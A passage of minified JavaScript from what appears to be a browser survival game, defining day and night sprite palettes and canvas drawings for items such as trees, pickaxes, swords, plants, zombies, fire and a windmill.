                    sprite[ze.GOLD][ze.NIGHT].push(c(lt(1.1, 0, ["#030d14", "#1b4444", "#16605a"]))),
                    sprite[ze.DIAMOND] = [],
                    sprite[ze.DIAMOND][ze.DAY] = [],
                    sprite[ze.DIAMOND][ze.NIGHT] = [],
                    sprite[ze.DIAMOND][ze.DAY].push(c(It(1.1, 0, ["#232828", "#3fc9c9", "#74ede6"]))),
                    sprite[ze.DIAMOND][ze.DAY].push(c(It(.9, 0, ["#232828", "#3fc9c9", "#74ede6"]))),
                    sprite[ze.DIAMOND][ze.DAY].push(c(It(.7, 0, ["#232828", "#3fc9c9", "#74ede6"]))),
                    sprite[ze.DIAMOND][ze.NIGHT].push(c(It(1.1, 0, ["#030d14", "#2b9390", "#57bcb5"]))),
                    sprite[ze.DIAMOND][ze.NIGHT].push(c(It(.9, 0, ["#030d14", "#2b9390", "#57bcb5"]))),
                    sprite[ze.DIAMOND][ze.NIGHT].push(c(It(.7, 0, ["#030d14", "#2b9390", "#57bcb5"]))),
                    sprite[ze.ALOE_VERA] = [],
                    sprite[ze.ALOE_VERA][ze.DAY] = IMAGES.ALOE_VERAD,
                    sprite[ze.ALOE_VERA][ze.NIGHT] = IMAGES.ALOE_VERAN,
                    sprite[ze.HAND_SHADOW] = [],
                    sprite[ze.HAND_SHADOW][ze.DAY] = c(K1(.6, ["#0d1b1c"])),
                    sprite[ze.HAND_SHADOW][ze.NIGHT] = c(K1(.6, ["#030d14"])),
                    sprite[ze.GLOVES_HOOD] = [],
                    sprite[ze.GLOVES_HOOD][ze.DAY] = c(k1(.6, ["#2a2938", "#242330"])),
                    sprite[ze.GLOVES_HOOD][ze.NIGHT] = c(k1(.6, ["#1b1e30", "#161921"])),
                    sprite[ze.ZOMBIE_BODY] = [],
                    sprite[ze.ZOMBIE_BODY][ze.DAY] = c(u1(.6, 0, ["#0d1b1c", "#759e6e", "#55604b", "#7d7252", "#575043"])),
                    sprite[ze.ZOMBIE_BODY][ze.NIGHT] = c(u1(.6, 0, ["#030d14", "#11635e", "#02373e", "#0b524d", "#07423f"])),
                    sprite[ze.ZOMBIE_HEAD] = [],
                    sprite[ze.ZOMBIE_HEAD][ze.DAY] = c(E1(.6, 0, ["#0d1b1c", "#759e6e", "#55604b", "#f9ccd4", "#891a1e", "#da232e", "#a52026", "#a02d28", "#721819", "#FFFFFF"])),
                    sprite[ze.ZOMBIE_HEAD][ze.NIGHT] = c(E1(.6, 0, ["#030d14", "#11635e", "#02373e", "#167771", "#0c5752", "#401d49", "#2e1336", "#261336", "#23163c", "#FFFFFF"])),
                    sprite[ze.ZOMBIE_HAND] = [],
                    sprite[ze.ZOMBIE_HAND][ze.DAY] = c(V1(.4, ["#0d1b1c", "#759e6e", "#55604b"])),
                    sprite[ze.ZOMBIE_HAND][ze.NIGHT] = c(V1(.4, ["#030d14", "#11635e", "#02373e"])),
                    sprite[ze.ZOMBIE_HURT] = c(d1(.6, ["#BB0000"])),
                    sprite[ze.ZOMBIE_HUNGER] = c(d1(.6, ["#DBE71C"])),
                    sprite[ze.ZOMBIE_HEAL] = c(d1(.6, ["#00BB00"])),
                    sprite[ze.TREE] = [],
                    sprite[ze.TREE][ze.DAY] = [],
                    sprite[ze.TREE][ze.NIGHT] = [],
                    sprite[ze.TREE][ze.DAY].push(U1(1.1, ["#242503", "#8e7c0c", "#6d5903", "#9e8320", "#f0f4f0", "#FFFFFF"], !1, 0)),
                    sprite[ze.TREE][ze.DAY].push(U1(1.1, ["#242503", "#8e7c0c", "#6d5903", "#9e8320", "#f0f4f0", "#FFFFFF"], !0, 0)),
                    sprite[ze.TREE][ze.DAY].push(U1(.9, ["#242503", "#898e0c", "#757303", "#9e9b20", "#f0f4f0", "#FFFFFF"], !1, 0)),
                    sprite[ze.TREE][ze.DAY].push(U1(.9, ["#242503", "#963400", "#7c2200", "#a83204", "#f0f4f0", "#FFFFFF"], !0, 0)),
                    sprite[ze.TREE][ze.DAY].push(U1(.7, ["#242503", "#6d5a09", "#77591a", "#7b5a1f", "#f0f4f0", "#FFFFFF"], !1, 0)),
                    sprite[ze.TREE][ze.DAY].push(U1(.7, ["#242503", "#703700", "#813009", "#813009", "#f0f4f0", "#FFFFFF"], !0, 0)),
                    sprite[ze.TREE][ze.NIGHT].push(U1(1.1, ["#030d14", "#12493d", "#0e3831", "#155247", "#f0f4f0", "#16695f"], !1, 0)),
                    sprite[ze.TREE][ze.NIGHT].push(U1(1.1, ["#030d14", "#12493d", "#0e3831", "#155247", "#16695f"], !0, 0)),
                    sprite[ze.TREE][ze.NIGHT].push(U1(.9, ["#030d14", "#0b3629", "#144437", "#174235", "#16695f"], !1, 0)),
                    sprite[ze.TREE][ze.NIGHT].push(U1(.9, ["#030d14", "#0d2522", "#0c2821", "#0d2a28", "#16695f"], !0, 0)),
                    sprite[ze.TREE][ze.NIGHT].push(U1(.7, ["#030d14", "#082b1f", "#073328", "#073327", "#16695f"], !1, 0)),
                    sprite[ze.TREE][ze.NIGHT].push(U1(.7, ["#030d14", "#0c2823", "#0b2b23", "#0c2d24", "#16695f"], !0, 0)),
                    sprite[ze.TREE_BRANCH] = [],
                    sprite[ze.TREE_BRANCH][ze.DAY] = [],
                    sprite[ze.TREE_BRANCH][ze.NIGHT] = [],
                    sprite[ze.TREE_BRANCH][ze.DAY].push(c(J1(F1(1.1, ["#242503", "#4d2d14", "#432516", "#756608", "#5b4a02", "#8b731b"], !1), sprite[ze.TREE][ze.DAY][0]))),
                    sprite[ze.TREE_BRANCH][ze.DAY].push(c(J1(F1(1.1, ["#242503", "#4d2d14", "#432516", "#756608", "#5b4a02", "#8b731b"], !0), sprite[ze.TREE][ze.DAY][1]))),
                    sprite[ze.TREE_BRANCH][ze.NIGHT].push(c(J1(F1(1.1, ["#030d14", "#031619", "#041c21", "#0e3b31", "#0b2e28", "#10443a"], !1), sprite[ze.TREE][ze.NIGHT][0]))),
                    sprite[ze.TREE_BRANCH][ze.NIGHT].push(c(J1(F1(1.1, ["#030d14", "#031619", "#041c21", "#0e3b31", "#0b2e28", "#10443a"], !0), sprite[ze.TREE][ze.NIGHT][1]))),
                    sprite[ze.TREE_BRANCH][ze.DAY].push(c(J1(F1(.9, ["#242503", "#4d2d14", "#432516", "#6d6c09", "#686609", "#777310"], !1), sprite[ze.TREE][ze.DAY][2]))),
                    sprite[ze.TREE_BRANCH][ze.DAY].push(c(J1(F1(.9, ["#242503", "#4d2d14", "#432516", "#6d6c09", "#686609", "#777310"], !0), sprite[ze.TREE][ze.DAY][2]))),
                    sprite[ze.TREE_BRANCH][ze.NIGHT].push(c(J1(F1(.9, ["#030d14", "#031619", "#041c21", "#0d2522", "#0c2821", "#0d2a28"], !1), sprite[ze.TREE][ze.NIGHT][2]))),
                    sprite[ze.TREE_BRANCH][ze.NIGHT].push(c(J1(F1(.9, ["#030d14", "#031619", "#041c21", "#0c2823", "#0b2b23", "#0c2d24"], !0), sprite[ze.TREE][ze.NIGHT][3]))),
                    sprite[ze.TREE][ze.DAY][5] = c(sprite[ze.TREE][ze.DAY][5]),
                    sprite[ze.TREE][ze.DAY][4] = c(sprite[ze.TREE][ze.DAY][4]),
                    sprite[ze.TREE][ze.DAY][3] = c(sprite[ze.TREE][ze.DAY][3]),
                    sprite[ze.TREE][ze.DAY][2] = c(sprite[ze.TREE][ze.DAY][2]),
                    sprite[ze.TREE][ze.DAY][1] = c(sprite[ze.TREE][ze.DAY][1]),
                    sprite[ze.TREE][ze.DAY][0] = c(sprite[ze.TREE][ze.DAY][0]),
                    sprite[ze.TREE][ze.NIGHT][5] = c(sprite[ze.TREE][ze.NIGHT][5]),
                    sprite[ze.TREE][ze.NIGHT][4] = c(sprite[ze.TREE][ze.NIGHT][4]),
                    sprite[ze.TREE][ze.NIGHT][3] = c(sprite[ze.TREE][ze.NIGHT][3]),
                    sprite[ze.TREE][ze.NIGHT][2] = c(sprite[ze.TREE][ze.NIGHT][2]),
                    sprite[ze.TREE][ze.NIGHT][1] = c(sprite[ze.TREE][ze.NIGHT][1]),
                    sprite[ze.TREE][ze.NIGHT][0] = c(sprite[ze.TREE][ze.NIGHT][0]),
                    sprite[ze.PICK_WOOD] = [],
                    sprite[ze.PICK_WOOD][ze.DAY] = c(I(4, X1(.75, !0, ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#4d2d14", "#432516"]))),
                    sprite[ze.PICK_WOOD][ze.NIGHT] = c(I(4, X1(.75, !0, ["#030d14", "#000000", "#030d14", "#0d2e33", "#0b2326", "#0d2e33", "#0b2326"]))),
                    sprite[ze.PICK] = [],
                    sprite[ze.PICK][ze.DAY] = c(I(4, X1(.75, !0, ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]))),
                    sprite[ze.PICK][ze.NIGHT] = c(I(4, X1(.75, !0, ["#030d14", "#000000", "#030d14", "#0d2e33", "#0b2326", "#485e66", "#1f343f"]))),
                    sprite[ze.PICK_GOLD] = [],
                    sprite[ze.PICK_GOLD][ze.DAY] = c(I(4, X1(.75, !0, ["#0d1b1c", "#000000", "#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"]))),
                    sprite[ze.PICK_GOLD][ze.NIGHT] = c(I(4, X1(.75, !0, ["#030d14", "#000000", "#030d14", "#263947", "#263947", "#43aa82", "#29997c"]))),
                    sprite[ze.PICK_DIAMOND] = [],
                    sprite[ze.PICK_DIAMOND][ze.DAY] = c(I(4, X1(.75, !0, ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"]))),
                    sprite[ze.PICK_DIAMOND][ze.NIGHT] = c(I(4, X1(.75, !0, ["#030d14", "#000000", "#030d14", "#111316", "#0a0b0c", "#73dde5", "#3dc4c0"]))),
                    sprite[ze.PICK_AMETHYST] = [],
                    sprite[ze.PICK_AMETHYST][ze.DAY] = c(I(4, X1(.75, !0, ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"]))),
                    sprite[ze.PICK_AMETHYST][ze.NIGHT] = c(I(4, X1(.75, !0, ["#030d14", "#000000", "#030d14", "#111316", "#0a0b0c", "#8359d3", "#764eb5"]))),
                    sprite[ze.PIRATE_SWORD] = [],
                    sprite[ze.PIRATE_SWORD][ze.DAY] = c(I(3, q1(.17, !0, ["#0d1b1c", "#4a3a22", "#362818", "#c7c7c7", "#909090", "#eceaea", "#bbbbbb", "#d6d1d1"]))),
                    sprite[ze.PIRATE_SWORD][ze.NIGHT] = c(I(3, q1(.17, !0, ["#0d1b1c", "#0d2e33", "#0b2326", "#59737d", "#364f59", "#618395", "#4d768c", "#54859f"]))),
                    sprite[ze.SUGAR_CAN] = [],
                    sprite[ze.SUGAR_CAN][ze.DAY] = c(I(3, st(.32, !0, ["#0d1b1c", "#ffffff", "#5f6061", "#eb2933", "#57b74e", "#42a54d", "#ac222a", "#e6636a"]))),
                    sprite[ze.SUGAR_CAN][ze.NIGHT] = c(I(3, st(.42, !0, ["#0d1b1c", "#485e66", "#1f343f", "#0d2e33", "#0b2326"]))),
                    sprite[ze.SWORD_WOOD] = [],
                    sprite[ze.SWORD_WOOD][ze.DAY] = c(I(3, j1(.4, !0, ["#0d1b1c", "#73583e", "#493425", "#7d6144", "#5e4530", "#473221", "#745840"]))),
                    sprite[ze.SWORD_WOOD][ze.NIGHT] = c(I(3, j1(.4, !0, ["#0d1b1c", "#0b3d3a", "#092b2a", "#144642", "#082927", "#092b29"]))),
                    sprite[ze.SWORD] = [],
                    sprite[ze.SWORD][ze.DAY] = c(I(3, Q1(.4, !0, ["#0d1b1c", "#939393", "#5f6061", "#b1afaf", "#493d36", "#332b28"]))),
                    sprite[ze.SWORD][ze.NIGHT] = c(I(3, Q1(.4, !0, ["#0d1b1c", "#485e66", "#1f343f", "#5d757e", "#0d2e33", "#0b2326"]))),
                    sprite[ze.SWORD_GOLD] = [],
                    sprite[ze.SWORD_GOLD][ze.DAY] = c(I(3, rt(.4, !0, ["#0d1b1c", "#c4bc51", "#b29c32", "#c4bc51", "#493e26", "#382e19"]))),
                    sprite[ze.SWORD_GOLD][ze.NIGHT] = c(I(3, rt(.4, !0, ["#0d1b1c", "#43aa82", "#29997c", "#54bf96", "#263947", "#182935"]))),
                    sprite[ze.SWORD_DIAMOND] = [],
                    sprite[ze.SWORD_DIAMOND][ze.DAY] = c(I(3, ot(.4, !0, ["#0d1b1c", "#6ad9e8", "#29aaa1", "#95e9f5", "#022320", "#011e19", "#FFFFFF"]))),
                    sprite[ze.SWORD_DIAMOND][ze.NIGHT] = c(I(3, ot(.4, !0, ["#0d1b1c", "#73dde5", "#3dc4c0", "#93eaf1", "#111316", "#0a0b0c"]))),
                    sprite[ze.SWORD_AMETHYST] = [],
                    sprite[ze.SWORD_AMETHYST][ze.DAY] = c(I(3, at(.4, !0, ["#0d1b1c", "#b864d6", "#8c29aa", "#cc81e7", "#262114", "#211108", "#FFFFFF"]))),
                    sprite[ze.SWORD_AMETHYST][ze.NIGHT] = c(I(3, at(.4, !0, ["#0d1b1c", "#8359d3", "#764eb5", "#966de6", "#111316", "#0a0b0c"]))),
                    sprite[ze.HERB] = [],
                    sprite[ze.HERB][ze.DAY] = [],
                    sprite[ze.HERB][ze.NIGHT] = [],
                    sprite[ze.HERB][ze.DAY].push(c(pt(.9, 0, ["#0d4f35"], 0))),
                    sprite[ze.HERB][ze.DAY].push(c(pt(.9, 0, ["#0d4f35"], 1))),
                    sprite[ze.HERB][ze.DAY].push(c(pt(.9, 0, ["#0d4f35"], 2))),
                    sprite[ze.HERB][ze.NIGHT].push(c(pt(.9, 0, ["#053339"], 0))),
                    sprite[ze.HERB][ze.NIGHT].push(c(pt(.9, 0, ["#053339"], 1))),
                    sprite[ze.HERB][ze.NIGHT].push(c(pt(.9, 0, ["#053339"], 2))),
                    sprite[ze.HERB][ze.DAY].push(c(gt(.8, ["#241301", "#ba6b0e", "#6d3f04"]))),
                    sprite[ze.HERB][ze.DAY].push(c(gt(.8, ["#292002", "#ba930e", "#6d5704"]))),
                    sprite[ze.HERB][ze.NIGHT].push(c(gt(.9, ["#052919", "#0a4738", "#06321f"]))),
                    sprite[ze.HERB][ze.NIGHT].push(c(gt(.8, ["#052918", "#08491c", "#063417"]))),
                    sprite[ze.SIGN] = [],
                    sprite[ze.SIGN][ze.DAY] = c(I(Math.PI / 2, _i(.25, !0, ["#0d1b1c", "#44301b", "#57442a", "#523e26"]))),
                    sprite[ze.SIGN][ze.NIGHT] = c(I(Math.PI / 2, _i(.25, !0, ["#030d14", "#082b22", "#0a2f2b", "#072824"]))),
                    sprite[ze.SIGN_BUTTON] = [],
                    sprite[ze.SIGN_BUTTON].push(c(Ei(.25, ["#44301b", "#57442a", "#523e26"], 0))),
                    sprite[ze.SIGN_BUTTON].push(c(Ei(.25, ["#4f371e", "#624d30", "#5e472c", "#eda80d"], 1))),
                    sprite[ze.SIGN_BUTTON].push(c(Ei(.25, ["#382715", "#4e3c25", "#473620", "#d7990c"], 2))),
                    sprite[ze.SYMBOLS] = [],
                    sprite[ze.SYMBOLS][ze.DAY] = [],
                    sprite[ze.SYMBOLS][ze.NIGHT] = [],
                    sprite[ze.SYMBOLS][ze.DAY].push(c(I(Math.PI / 2, ui(.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#9b2b25"], 1)))),
                    sprite[ze.SYMBOLS][ze.NIGHT].push(c(I(Math.PI / 2, ui(.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#9b2b25"], 1)))),
                    sprite[ze.SYMBOLS][ze.DAY].push(c(I(Math.PI / 2, ui(.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#4f9246"], 2)))),
                    sprite[ze.SYMBOLS][ze.NIGHT].push(c(I(Math.PI / 2, ui(.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#4f9246"], 2)))),
                    sprite[ze.SYMBOLS][ze.DAY].push(c(I(Math.PI / 2, ui(.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#9b2b25", "#ffffff"], 3)))),
                    sprite[ze.SYMBOLS][ze.NIGHT].push(c(I(Math.PI / 2, ui(.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#9b2b25", "#ffffff"], 3)))),
                    sprite[ze.SYMBOLS][ze.DAY].push(c(I(Math.PI / 2, ui(.25, 0, ["#0d1b1c", "#44301b", "#57442a", "#523e26", "#9b2b25", "#362513"], 4)))),
                    sprite[ze.SYMBOLS][ze.NIGHT].push(c(I(Math.PI / 2, ui(.25, 0, ["#030d14", "#082b22", "#0a2f2b", "#072824", "#9b2b25", "#664d2e"], 4)))),
                    sprite[ze.PLANT] = [],
                    sprite[ze.PLANT][ze.DAY] = [c(ct(1.2, !0, ["#352b10", "#80500b", "#7c4908"]))],
                    sprite[ze.PLANT][ze.NIGHT] = [c(ct(1.2, !0, ["#030d14", "#0a3429", "#0a2f2b"]))],
                    sprite[ze.DRIED_PLANT] = [],
                    sprite[ze.DRIED_PLANT][ze.DAY] = c(ct(.8, !0, ["#0e3022", "#68622D", "#665329"])),
                    sprite[ze.DRIED_PLANT][ze.NIGHT] = c(ct(.8, !0, ["#030d14", "#0F3A24", "#083326"])),
                    sprite[ze.PUMPKIN] = [],
                    sprite[ze.PUMPKIN][ze.DAY] = c(C0(.5, !0, ["#1b170c", "#c67933", "#a6692f", "#bd7533", "#86683e", "#6e502d"])),
                    sprite[ze.PUMPKIN][ze.NIGHT] = c(C0(.5, !0, ["#030d14", "#0a3429", "#0a2f2b", "#082f25", "#082925", "#0a3630"])),
                    sprite[ze.GARLIC] = [],
                    sprite[ze.GARLIC][ze.DAY] = c(n1(.5, !0, ["#1b170c", "#e8e8e8", "#d2cfcf", "#e0e1e0", "#c4c4c4"])),
                    sprite[ze.GARLIC][ze.NIGHT] = c(n1(.5, !0, ["#030d14", "#2b5254", "#264a46", "#396260", "#244743"])),
                    sprite[ze.THORNBUSH] = [],
                    sprite[ze.THORNBUSH][ze.DAY] = c(b0(.5, !0, ["#1b170c", "#349970", "#245c45", "#348361", "#e8e8e8", "#bbbbbb"])),
                    sprite[ze.THORNBUSH][ze.NIGHT] = c(b0(.5, !0, ["#030d14", "#0d5551", "#074440", "#0f5c58", "#4e8784", "#3f7572"])),
                    sprite[ze.PLANT_MINI] = [],
                    sprite[ze.PLANT_MINI][ze.DAY] = c(ct(.8, !0, ["#1b170c", "#0b8052", "#077b49"])),
                    sprite[ze.PLANT_MINI][ze.NIGHT] = c(ct(.8, !0, ["#030d14", "#084442", "#0a4049"])),
                    sprite[ze.DRIED_PUMPKIN] = [],
                    sprite[ze.DRIED_PUMPKIN][ze.DAY] = c(C0(.5, !0, ["#1b170c", "#68622D", "#665329", "#5e5823", "#86683e", "#6e502d"])),
                    sprite[ze.DRIED_PUMPKIN][ze.NIGHT] = c(C0(.5, !0, ["#030d14", "#0F3A24", "#083326", "#0c301e", "#062a1f", "#083b2b"])),
                    sprite[ze.DRIED_GARLIC] = [],
                    sprite[ze.DRIED_GARLIC][ze.DAY] = c(n1(.5, !0, ["#1b170c", "#adbe9e", "#7e9178", "#84aa84", "#527556"])),
                    sprite[ze.DRIED_GARLIC][ze.NIGHT] = c(n1(.5, !0, ["#030d14", "#164a44", "#124244", "#13373b", "#133e3e"])),
                    sprite[ze.DRIED_THORNBUSH] = [],
                    sprite[ze.DRIED_THORNBUSH][ze.DAY] = c(b0(.5, !0, ["#1b170c", "#7a9160", "#4a5e3c", "#637e5a", "#c5cfc0", "#8a9685"])),
                    sprite[ze.DRIED_THORNBUSH][ze.NIGHT] = c(b0(.5, !0, ["#030d14", "#3e5d5b", "#2f4442", "#354e4c", "#637d7c", "#556b6a"])),
                    sprite[ze.GIFT] = [],
                    sprite[ze.GIFT][ze.DAY] = c(w0(.45, !0, ["#0e3022", "#ac222a", "#98171e", "#22a84f", "#1f924a"])),
                    sprite[ze.GIFT][ze.NIGHT] = c(w0(.45, !0, ["#0e3022", "#19386e", "#0b2752", "#124252", "#0d3441"])),
                    sprite[ze.HURT_GIFT] = c(w0(.65, !0, ["rgba(14, 48, 34, 0)", "#BB0000", "#BB0000", "#BB0000", "#BB0000"])),
                    sprite[ze.FRUIT] = [],
                    sprite[ze.FRUIT][ze.DAY] = c(Ot(1.4, 0, ["#3d2a6e", "#8255b5"])),
                    sprite[ze.FRUIT][ze.NIGHT] = c(Ot(1.4, 0, ["#26124f", "#524082"])),
                    sprite[ze.FIRE] = [],
                    sprite[ze.FIRE][ze.DAY] = c(H1(.9, 0, ["#efd435", "#ec8d35", "#e96132"])),
                    sprite[ze.FIRE][ze.NIGHT] = c(H1(.9, 0, ["#efdb7b", "#efe854", "#e8ef62"])),
                    sprite[ze.BIG_FIRE_WOOD] = [],
                    sprite[ze.BIG_FIRE_WOOD][ze.DAY] = c(G1(.9, 0, ["#4d2d14", "#432516"])),
                    sprite[ze.BIG_FIRE_WOOD][ze.NIGHT] = c(G1(.9, 0, ["#282404", "#0a0a01"])),
                    sprite[ze.WOOD_FIRE] = [],
                    sprite[ze.WOOD_FIRE][ze.DAY] = c(P1(.9, 0, ["#4d2d14", "#432516"])),
                    sprite[ze.WOOD_FIRE][ze.NIGHT] = c(P1(.9, 0, ["#282404", "#0a0a01"])),
                    sprite[ze.HALO_FIRE] = [],
                    sprite[ze.HALO_FIRE][ze.DAY] = c(B1(.9, 0, ["#efd435"])),
                    sprite[ze.HALO_FIRE][ze.NIGHT] = c(B1(.9, 0, ["#fffabb"])),
                    sprite[ze.GROUND_FIRE] = [],
                    sprite[ze.GROUND_FIRE][ze.DAY] = c(z1(.9, 0, ["#efd435"])),
                    sprite[ze.GROUND_FIRE][ze.NIGHT] = c(z1(.9, 0, ["#fffabb"])),
                    sprite[ze.HALO_FIRE_PUMPKIN] = [],
                    sprite[ze.HALO_FIRE_PUMPKIN][ze.DAY] = c(B1(.9, 0, ["#efd435"])),
                    sprite[ze.HALO_FIRE_PUMPKIN][ze.NIGHT] = c(B1(.9, 0, ["rgba(255, 84, 0, 1)"])),
                    sprite[ze.GROUND_FIRE_PUMPKIN] = [],
                    sprite[ze.GROUND_FIRE_PUMPKIN][ze.DAY] = c(z1(.9, 0, ["#efd435"])),
                    sprite[ze.GROUND_FIRE_PUMPKIN][ze.NIGHT] = c(z1(.9, 0, ["#ff5704"])),
                    sprite[ze.GEAR] = c(I1(1, "#ffffff")),
                    sprite[ze.GEAR2] = c(I1(1.5, "#ffffff")),
                    sprite[ze.YOUR_SCORE] = c(Tt(1, "Your score:", 15, "#FFF")),
                    sprite[ze.WINDMILL_CASES] = c((E = .9,
                        T = ["#596560", "#394841", "#543B1C", "#694D28", "#4D3C1A", "#694D28", "#DEE2E0", "#CDCCCC", "#7B5A31", "#7E8A85"],
                        s = document.createElement("canvas"),
                        r = s.getContext("2d"),
                        s.width = 243 * E,
                        s.height = 172 * E,
                        ke(r, 119.5 * E, 140.125 * E, 19 * E),
                        he(r, void 0, T[1], 5 * E),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(36.5 * E, 20.125 * E),
                        r.bezierCurveTo(119.5 * E, 20.625 * E, 119.5 * E, 20.625 * E, 202.5 * E, 21.125 * E),
                        r.bezierCurveTo(214.5 * E, 22.125 * E, 216.5 * E, 26.125 * E, 217.5 * E, 35.125 * E),
                        r.bezierCurveTo(221 * E, 76.125 * E, 221 * E, 76.125 * E, 224.5 * E, 117.125 * E),
                        r.bezierCurveTo(225.5 * E, 127.125 * E, 221.5 * E, 131.125 * E, 210.5 * E, 132.125 * E),
                        r.bezierCurveTo(117.5 * E, 132.125 * E, 117.5 * E, 132.125 * E, 24.5 * E, 132.125 * E),
                        r.bezierCurveTo(14.5 * E, 131.125 * E, 13.5 * E, 126.125 * E, 16.5 * E, 111.125 * E),
                        r.bezierCurveTo(19.5 * E, 73.125 * E, 19.5 * E, 73.125 * E, 22.5 * E, 35.125 * E),
                        r.bezierCurveTo(23.5 * E, 23.125 * E, 29.5 * E, 21.125 * E, 36.5 * E, 20.125 * E),
                        r.closePath(),
                        he(r, T[0], T[1], 4 * E),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(15.5 * E, 138.625 * E),
                        r.bezierCurveTo(120 * E, 138.625 * E, 120 * E, 138.625 * E, 224.5 * E, 138.625 * E),
                        r.closePath(),
                        he(r, void 0, T[2], 10 * E),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(13.5 * E, 131.625 * E),
                        r.bezierCurveTo(119.5 * E, 131.625 * E, 119.5 * E, 131.625 * E, 225.5 * E, 131.625 * E),
                        r.closePath(),
                        he(r, void 0, T[3], 10 * E),
                        ke(r, 119.5 * E, 140.125 * E, 14.866068747318506 * E),
                        he(r, T[4], T[5], 4 * E),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(106.5 * E, 146.625 * E),
                        r.bezierCurveTo(116.5 * E, 137.625 * E, 118.5 * E, 136.625 * E, 123.5 * E, 138.625 * E),
                        r.bezierCurveTo(131.5 * E, 145.625 * E, 133.5 * E, 148.625 * E, 127.5 * E, 152.625 * E),
                        r.bezierCurveTo(115.5 * E, 158.625 * E, 111.5 * E, 153.625 * E, 106.5 * E, 147.625 * E),
                        r.closePath(),
                        he(r, T[6], T[7], 2 * E),
                        r.beginPath(),
                        r.lineCap = "round",
                        r.lineJoin = "round",
                        r.moveTo(105.5 * E, 146.625 * E),
                        r.bezierCurveTo(116.5 * E, 159.625 * E, 124.5 * E, 156.625 * E, 132.5 * E, 146.625 * E),
                        he(r, void 0, T[8], 5 * E),
                        r.save(),
                        r.translate(75.5 * E, 80.125 * E),
                        Ve(r, -39 * E, -40 * E, 78 * E, 78 * E, 10 * E),
                        r.restore(),
                        he(r, T[9]),
                        r.save(),
                        r.translate(167 * E, 80.125 * E),
                        Ve(r, -38.5 * E, -39 * E, 78 * E, 78 * E, 10 * E),
                        r.restore(),
                        he(r, T[9]),
                        s)),
                    sprite[ze.EXTRACTOR_CASES] = IMAGES.EXTRACTOR_CASES,
                    sprite[ze.WINDMILL] = [],
                    sprite[ze.WINDMILL][ze.DAY] = c(D1(1.5, !0, ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"])),
                    sprite[ze.WINDMILL][ze.NIGHT] = c(D1(1.5, !0, ["#030d14", "#163A3A", "#214C4B", "#1a4545", "#225755", "#07393D", "#07454a", "#0c484d", "#163A3A", "#214C4B"])),
                    sprite[ze.WINDMILL_WINGS] = [],
                    sprite[ze.WINDMILL_WINGS][ze.DAY] = c(v1(2, !0, ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"])),
                    sprite[ze.WINDMILL_WINGS][ze.NIGHT] = c(v1(2, !0, ["#030d14", "#163A3A", "#214C4B", "#1a4545", "#225755", "#07393D", "#07454a", "#0c484d", "#163A3A", "#214C4B"])),
                    sprite[ze.WINDMILL_HEAD] = [],
                    sprite[ze.WINDMILL_HEAD][ze.DAY] = c(M1(1.5, !0, ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"])),
                    sprite[ze.WINDMILL_HEAD][ze.NIGHT] = c(M1(1.5, !0, ["#030d14", "#163A3A", "#214C4B", "#1a4545", "#225755", "#07393D", "#07454a", "#0c484d", "#163A3A", "#214C4B"])),
                    sprite[ze.WILD_WHEAT] = [],
                    sprite[ze.WILD_WHEAT][ze.DAY] = c(m1(2.2, 0, ["#A89F67", "#9E8456"])),
                    sprite[ze.WILD_WHEAT][ze.NIGHT] = c(m1(2.2, 0, ["#0B4049", "#08383D"])),
                    sprite[ze.DRIED_WHEAT] = [],
                    sprite[ze.DRIED_WHEAT][ze.DAY] = c(m1(2.2, 0, ["#68622D", "#665329"])),
                    sprite[ze.DRIED_WHEAT][ze.NIGHT] = c(m1(2.2, 0, ["#0F3A24", "#083326"])),
                    sprite[ze.WHEAT_MOB] = [],
                    sprite[ze.WHEAT_MOB][ze.DAY] = c(dt(.8, 0, ["#A89F67", "#9E8456"])),
                    sprite[ze.WHEAT_MOB][ze.NIGHT] = c(dt(.8, 0, ["#15514F", "#0F3F3D"])),
                    sprite[ze.PUMPKIN_SEED_MOB] = [],
                    sprite[ze.PUMPKIN_SEED_MOB][ze.DAY] = c(dt(.8, 0, ["#c67933", "#b17238"])),
                    sprite[ze.PUMPKIN_SEED_MOB][ze.NIGHT] = c(dt(.8, 0, ["#043c37", "#032b23"])),
                    sprite[ze.ALOE_VERA_SEED_MOB] = [],
                    sprite[ze.ALOE_VERA_SEED_MOB][ze.DAY] = c(dt(.8, 0, ["#3a8214", "#4a9c1e"])),
                    sprite[ze.ALOE_VERA_SEED_MOB][ze.NIGHT] = c(dt(.8, 0, ["#032d29", "#044640"])),
                    sprite[ze.GARLIC_SEED_MOB] = [],
                    sprite[ze.GARLIC_SEED_MOB][ze.DAY] = c(dt(.8, 0, ["#e8e8e8", "#bbbbbb"])),
                    sprite[ze.GARLIC_SEED_MOB][ze.NIGHT] = c(dt(.8, 0, ["#1c6161", "#07413f"])),
                    sprite[ze.THORNBUSH_SEED_MOB] = [],
                    sprite[ze.THORNBUSH_SEED_MOB][ze.DAY] = c(dt(.8, 0, ["#328a56", "#449573"])),
                    sprite[ze.THORNBUSH_SEED_MOB][ze.NIGHT] = c(dt(.8, 0, ["#043c37", "#032b23"])),
                    sprite[ze.CARROT_SEED_MOB] = [],
